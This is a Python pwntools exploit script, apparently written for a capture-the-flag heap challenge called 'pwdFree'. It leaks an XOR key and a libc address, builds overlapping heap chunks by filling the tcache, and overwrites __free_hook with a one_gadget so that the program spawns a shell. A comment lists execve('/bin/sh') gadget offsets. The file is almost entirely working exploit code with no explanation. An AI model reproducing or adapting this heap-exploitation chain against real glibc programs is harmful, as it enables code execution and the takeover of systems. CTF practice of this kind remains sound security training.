#coding:utf-8
from pwn import *

#context.log_level='debug'
#context.terminal=['tmux','splitw','-h']

sh = process('./pwdFree')
#gdb.attach(sh)#,'b *$rebase(0x164e)')
libc = ELF('./libc.so.6')

def add(index,size,content):
   sh.sendlineafter('Choice:','1')
   sh.sendlineafter('Save:',str(index))
   sh.sendlineafter('Pwd:',str(size))
   sh.sendafter('Pwd:',content)
 
def edit(index,content):
   sh.sendlineafter('Choice:','2')
   sh.sendline(str(index))
   sleep(0.5)
   sh.send(content)
 
def show(index):
   sh.sendlineafter('Choice:','3')
   sh.sendlineafter('Check:',str(index))
 
def delete(index):
   sh.sendlineafter('Choice:','4')
   sh.sendlineafter('Delete:',str(index))

add(0,1,'\x00') #content设置为0， 任何数字和0异或等于自己
sh.recvuntil('Save ID:')
num = u64(sh.recv(8))
print '[+]^num=>',hex(num)
# pause()
#overlap

payload = 0x80*'a'+p64((0x100+0x90+0x90)^num)+'\x00'
add(1,0xf0,'junk'.ljust(0xf0,'\x00')) #1
add(2,0x80,'payload'.ljust(0x80,'\x00')) #2
add(3,0x80,'overlap'.ljust(0x80,'\x00')) #3
add(4,0xf0,'protect'.ljust(0xf0,'\x00')) #4

for i in range(5,12):
   add(i,0xF0,'aaaa'*0xd0)
for i in range(5,12):
   delete(i)


delete(3)
add(3,0x88,payload)
delete(1)
delete(4)
pause()
for i in range(5,12):
   add(i,0xF0,'a'*0xf0)
add(1,0xF0,'a'*0xF0) #1

show(2)
sh.recvuntil('Pwd is: ')
libc_base = (u64(sh.recv(8)) ^ num) - 0x3ebc40 -96
print hex(libc_base)

system_addr = libc_base + libc.sym['system']
free_hook_addr = libc_base + libc.sym['__free_hook']
'''
0x4f3d5 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
 
0x4f432 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL
 
0x10a41c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
  '''
onegdaget=0x4f432 + libc_base
delete(3)
add(3,0x98,'b'*0x80 + (p64(0 ^ num) + p64(0x91 ^ num) + p64(free_hook_addr ^ num)))
add(20,0x80,p64(0) + 'c'*0x78)
add(21,0x80,p64(onegdaget ^ num) + 'd'*0x78)
 
pause()
 
delete(20)
 
sh.interactive()